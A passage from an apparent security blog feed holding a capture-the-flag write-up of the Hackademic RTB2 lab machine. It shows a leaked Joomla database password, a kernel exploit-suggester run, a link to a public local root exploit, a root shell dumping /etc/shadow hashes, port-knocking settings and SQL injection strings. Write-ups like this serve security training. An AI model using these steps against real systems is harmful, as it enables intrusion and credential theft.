</span><span class='line'><span class="k">var</span> <span class="nv">$editor</span> <span class="o">=</span> <span class="s1">&#39;tinymce&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$list_limit</span> <span class="o">=</span> <span class="s1">&#39;20&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$legacy</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
</span><span class='line'><span class="cm">/* Debug Settings */</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$debug</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$debug_lang</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
</span><span class='line'><span class="cm">/* Database Settings */</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$dbtype</span> <span class="o">=</span> <span class="s1">&#39;mysql&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$host</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$user</span> <span class="o">=</span> <span class="s1">&#39;root&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$password</span> <span class="o">=</span> <span class="s1">&#39;yUtJklM97W&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$db</span> <span class="o">=</span> <span class="s1">&#39;joomla&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$dbprefix</span> <span class="o">=</span> <span class="s1">&#39;jos_&#39;</span><span class="p">;</span>
</span><span class='line'><span class="cm">/* Server Settings */</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$live_site</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$secret</span> <span class="o">=</span> <span class="s1">&#39;iFzlVUCg9BBPoUDU&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$gzip</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$error_reporting</span> <span class="o">=</span> <span class="s1">&#39;-1&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$helpurl</span> <span class="o">=</span> <span class="s1">&#39;http://help.joomla.org&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$xmlrpc_server</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$ftp_host</span> <span class="o">=</span> <span class="s1">&#39;127.0.0.1&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$ftp_port</span> <span class="o">=</span> <span class="s1">&#39;21&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$ftp_user</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$ftp_pass</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$ftp_root</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$ftp_enable</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$force_ssl</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
</span><span class='line'><span class="cm">/* Locale Settings */</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$offset</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$offset_user</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
</span><span class='line'><span class="cm">/* Mail Settings */</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$mailer</span> <span class="o">=</span> <span class="s1">&#39;mail&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$mailfrom</span> <span class="o">=</span> <span class="s1">&#39;admin@hackademirtb2.com&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$fromname</span> <span class="o">=</span> <span class="s1">&#39;Hackademic.RTB2&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$sendmail</span> <span class="o">=</span> <span class="s1">&#39;/usr/sbin/sendmail&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$smtpauth</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$smtpsecure</span> <span class="o">=</span> <span class="s1">&#39;none&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$smtpport</span> <span class="o">=</span> <span class="s1">&#39;25&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$smtpuser</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$smtppass</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$smtphost</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
</span><span class='line'><span class="cm">/* Cache Settings */</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$caching</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$cachetime</span> <span class="o">=</span> <span class="s1">&#39;15&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$cache_handler</span> <span class="o">=</span> <span class="s1">&#39;file&#39;</span><span class="p">;</span>
</span><span class='line'><span class="cm">/* Meta Settings */</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$MetaDesc</span> <span class="o">=</span> <span class="s1">&#39;Joomla! - the dynamic portal engine and content management system&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$MetaKeys</span> <span class="o">=</span> <span class="s1">&#39;joomla, Joomla&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$MetaTitle</span> <span class="o">=</span> <span class="s1">&#39;1&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$MetaAuthor</span> <span class="o">=</span> <span class="s1">&#39;1&#39;</span><span class="p">;</span>
</span><span class='line'><span class="cm">/* SEO Settings */</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$sef</span>           <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$sef_rewrite</span>   <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$sef_suffix</span>    <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
</span><span class='line'><span class="cm">/* Feed Settings */</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$feed_limit</span>   <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$feed_email</span>   <span class="o">=</span> <span class="s1">&#39;author&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$log_path</span> <span class="o">=</span> <span class="s1">&#39;/var/www/logs&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$tmp_path</span> <span class="o">=</span> <span class="s1">&#39;/var/www/tmp&#39;</span><span class="p">;</span>
</span><span class='line'><span class="cm">/* Session Setting */</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$lifetime</span> <span class="o">=</span> <span class="s1">&#39;15&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$session_handler</span> <span class="o">=</span> <span class="s1">&#39;database&#39;</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>We download the <a href="https://github.com/PenturaLabs/Linux_Exploit_Suggester">Linux_Exploit_Suggester.pl</a> and use for finding an exploit for privilege escalation:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@HackademicRTB2:/tmp$ perl Linux_Exploit_Suggester.pl
</span><span class='line'>perl Linux_Exploit_Suggester.pl
</span><span class='line'>
</span><span class='line'>Kernel local: 2.6.32
</span><span class='line'>
</span><span class='line'>Searching among 65 exploits...
</span><span class='line'>
</span><span class='line'>Possible Exploits:
</span><span class='line'>[+] american-sign-language
</span><span class='line'>   CVE-2010-4347
</span><span class='line'>   Source: http://www.securityfocus.com/bid/45408/
</span><span class='line'>[+] can_bcm
</span><span class='line'>   CVE-2010-2959
</span><span class='line'>   Source: http://www.exploit-db.com/exploits/14814/
</span><span class='line'>[+] half_nelson
</span><span class='line'>   Alt: econet    CVE-2010-3848
</span><span class='line'>   Source: http://www.exploit-db.com/exploits/6851
</span><span class='line'>[+] half_nelson1
</span><span class='line'>   Alt: econet    CVE-2010-3848
</span><span class='line'>   Source: http://www.exploit-db.com/exploits/17787/
</span><span class='line'>[+] half_nelson2
</span><span class='line'>   Alt: econet    CVE-2010-3850
</span><span class='line'>   Source: http://www.exploit-db.com/exploits/17787/
</span><span class='line'>[+] half_nelson3
</span><span class='line'>   Alt: econet    CVE-2010-4073
</span><span class='line'>   Source: http://www.exploit-db.com/exploits/17787/
</span><span class='line'>[+] msr
</span><span class='line'>   CVE-2013-0268
</span><span class='line'>   Source: http://www.exploit-db.com/exploits/27297/
</span><span class='line'>[+] pktcdvd
</span><span class='line'>   CVE-2010-3437
</span><span class='line'>   Source: http://www.exploit-db.com/exploits/15150/
</span><span class='line'>[+] ptrace_kmod2
</span><span class='line'>   Alt: ia32syscall,robert_you_suck    CVE-2010-3301
</span><span class='line'>   Source: http://www.exploit-db.com/exploits/15023/
</span><span class='line'>[+] rawmodePTY
</span><span class='line'>   CVE-2014-0196
</span><span class='line'>   Source: http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c
</span><span class='line'>[+] rds
</span><span class='line'>   CVE-2010-3904
</span><span class='line'>   Source: http://www.exploit-db.com/exploits/15285/
</span><span class='line'>[+] reiserfs
</span><span class='line'>   CVE-2010-1146
</span><span class='line'>   Source: http://www.exploit-db.com/exploits/12130/
</span><span class='line'>[+] video4linux
</span><span class='line'>   CVE-2010-3081
</span><span class='line'>   Source: http://www.exploit-db.com/exploits/15024/</span></code></pre></td></tr></table></div></figure>


<p>We root the server using:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/15285.c
</span><span class='line'>
</span><span class='line'>[+] rds
</span><span class='line'>   CVE-2010-3904
</span><span class='line'>   Source: http://www.exploit-db.com/exploits/15285/</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># cat /etc/shadow
</span><span class='line'>cat /etc/shadow
</span><span class='line'>root:$6$YB3puY.G$drg9.SqpJyPujoS82zbwdQtM7xgPpAJlDmdQaH8tu2ndUrmNwIx29lYazyhhsFKKF.yw6ScopFmMAh.t/qIZn0:14999:0:99999:7:::
</span><span class='line'>daemon:*:14837:0:99999:7:::
</span><span class='line'>bin:*:14837:0:99999:7:::
</span><span class='line'>sys:*:14837:0:99999:7:::
</span><span class='line'>sync:*:14837:0:99999:7:::
</span><span class='line'>games:*:14837:0:99999:7:::
</span><span class='line'>man:*:14837:0:99999:7:::
</span><span class='line'>lp:*:14837:0:99999:7:::
</span><span class='line'>mail:*:14837:0:99999:7:::
</span><span class='line'>news:*:14837:0:99999:7:::
</span><span class='line'>uucp:*:14837:0:99999:7:::
</span><span class='line'>proxy:*:14837:0:99999:7:::
</span><span class='line'>www-data:*:14837:0:99999:7:::
</span><span class='line'>backup:*:14837:0:99999:7:::
</span><span class='line'>list:*:14837:0:99999:7:::
</span><span class='line'>irc:*:14837:0:99999:7:::
</span><span class='line'>gnats:*:14837:0:99999:7:::
</span><span class='line'>nobody:*:14837:0:99999:7:::
</span><span class='line'>libuuid:!:14837:0:99999:7:::
</span><span class='line'>syslog:*:14837:0:99999:7:::
</span><span class='line'>messagebus:*:14837:0:99999:7:::
</span><span class='line'>avahi-autoipd:*:14837:0:99999:7:::
</span><span class='line'>avahi:*:14837:0:99999:7:::
</span><span class='line'>couchdb:*:14837:0:99999:7:::
</span><span class='line'>speech-dispatcher:!:14837:0:99999:7:::
</span><span class='line'>usbmux:*:14837:0:99999:7:::
</span><span class='line'>haldaemon:*:14837:0:99999:7:::
</span><span class='line'>kernoops:*:14837:0:99999:7:::
</span><span class='line'>pulse:*:14837:0:99999:7:::
</span><span class='line'>rtkit:*:14837:0:99999:7:::
</span><span class='line'>saned:*:14837:0:99999:7:::
</span><span class='line'>hplip:*:14837:0:99999:7:::
</span><span class='line'>gdm:*:14837:0:99999:7:::
</span><span class='line'>p0wnbox:$6$AT8lMX0W$GPAZaGLMX0mi5EPFhx9wT5qJu9bxkIEfH.cmKX/j/O3QpRWXgBQ2WUAa.SIoFGdcfKrv.FtuBVn1UonfItMrw1:14999:0:99999:7:::
</span><span class='line'>mysql:!:14991:0:99999:7:::
</span><span class='line'>
</span><span class='line'># pwd
</span><span class='line'>pwd
</span><span class='line'>/root
</span><span class='line'># ls -l 
</span><span class='line'>ls -l 
</span><span class='line'>total 40
</span><span class='line'>drwxr-xr-x 2 root root  4096 Jan 17  2011 Desktop
</span><span class='line'>-rwxr-xr-x 1 root root 33921 Jan 22  2011 Key.txt
</span><span class='line'>
</span><span class='line'># cat /etc/knockd.conf
</span><span class='line'>cat /etc/knockd.conf
</span><span class='line'>[options]
</span><span class='line'>        UseSyslog
</span><span class='line'>
</span><span class='line'>[openHTTPD]
</span><span class='line'>        sequence    = 7000,8000,9000
</span><span class='line'>        seq_timeout = 5
</span><span class='line'>        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 666 -j ACCEPT
</span><span class='line'>        tcpflags    = syn
</span><span class='line'>
</span><span class='line'>[closeHTTPD]
</span><span class='line'>        sequence    = 9000,8000,7000
</span><span class='line'>        seq_timeout = 5
</span><span class='line'>        command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 666 -j ACCEPT
</span><span class='line'>        tcpflags    = syn
</span><span class='line'>
</span><span class='line'>
</span><span class='line'># base64 -d /root/Key.txt > /var/www/key.png
</span><span class='line'>base64 -d /root/Key.txt > /var/www/key.png</span></code></pre></td></tr></table></div></figure>


<p>We can check the flag <a href="http://192.168.80.150:666/key.png">here</a>. As we can see
from output above, there is port-knocking mechanism using sequences 7000,8000,9000.</p>

<p>Finally we want to see the check.php source:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="c1"># cat /var/www/welcome/check.php</span>
</span><span class='line'><span class="nx">cat</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">welcome</span><span class="o">/</span><span class="nx">check</span><span class="o">.</span><span class="nx">php</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">meta</span> <span class="nx">http</span><span class="o">-</span><span class="nx">equiv</span><span class="o">=</span><span class="s2">&quot;Content-Type&quot;</span> <span class="nx">content</span><span class="o">=</span><span class="s2">&quot;text/html; charset=UTF-8&quot;</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">head</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">title</span><span class="o">&gt;</span><span class="nx">Hackademic</span><span class="o">.</span><span class="nx">RTB2</span><span class="o">&lt;/</span><span class="nx">title</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">center</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">body</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;black&quot;</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&quot;hackademicrtb2.png&quot;</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="s2">&quot;green&quot;</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">head</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">form</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">h2</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="nv">$pass_answer</span> <span class="o">=</span> <span class="s2">&quot;&#39; or 1=1--&#39;&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$pass_answer_2</span> <span class="o">=</span> <span class="s2">&quot;&#39; OR 1=1--&#39;&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$pass_answer</span> <span class="k">or</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$pass_answer_2</span><span class="p">){</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;&lt;h2&gt;&#39;</span><span class="p">;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;Ok, nice shot...&#39;</span><span class="p">;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;&lt;/h2&gt;&#39;</span><span class="p">;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;...but, you are looking in a wrong place bro! ;-)&#39;</span><span class="p">;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;&lt;font color=&quot;black&quot;&gt;&#39;</span><span class="p">;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;%33%63%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%33%65%20%30%64%20%30%61%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%32%30%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%32%30%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%36%39%20%36%65%20%32%37%20%32%30%20%36%66%20%36%65%20%32%30%20%36%38%20%36%35%20%36%31%20%37%36%20%36%35%20%36%65%20%32%37%20%37%33%20%32%30%20%36%34%20%36%66%20%36%66%20%37%32%20%32%30%20%32%65%20%32%65%20%32%30%20%33%61%20%32%39%20%30%64%20%30%61%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%30%64%20%30%61%20%33%63%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%33%65%0A&#39;</span><span class="p">;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;&lt;/font color=&quot;black&quot;&gt;&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">else</span><span class="p">{</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;&lt;h2&gt;&#39;</span><span class="p">;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;You are trying to login with wrong credentials!&#39;</span><span class="p">;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;&lt;/h2&gt;&#39;</span><span class="p">;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s2">&quot;Please try again...&quot;</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>After decoding the hex characters and converting binary digits in ruby:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>irb(main):017:0>  [0b00110001, 0b00110000, 0b00110000, 0b00110001, 0b00111010, 0b00110001, 0b00110001, 0b00110000, 0b00110001, 0b00111010, 0b00110001, 0b00110000, 0b00110001, 0b00110001, 0b00111010, 0b00110001, 0b00110000, 0b00110000, 0b00110001].map{|x|x.chr}.join
</span><span class='line'>=> "1001:1101:1011:1001"</span></code></pre></td></tr></table></div></figure>


<p>So the SQLi test is validated using string compare operator and it&rsquo;s quite
non-realistic (and unfair) to have two statements with the different case, that
was the reason why we didn&rsquo;t found out this firstly.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hackademic: RTB1]]></title>
    <link href="http://73696e65.github.io/blog/2015/05/29/hackademic-rtb1/"/>
    <updated>2015-05-29T14:32:12+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/05/29/hackademic-rtb1</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/hackademic-rtb1,17/">Hackademic: RTB1</a></p>

<p>We gained the IP address 192.168.80.146 for our testing target.</p>

<p>Nmap output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
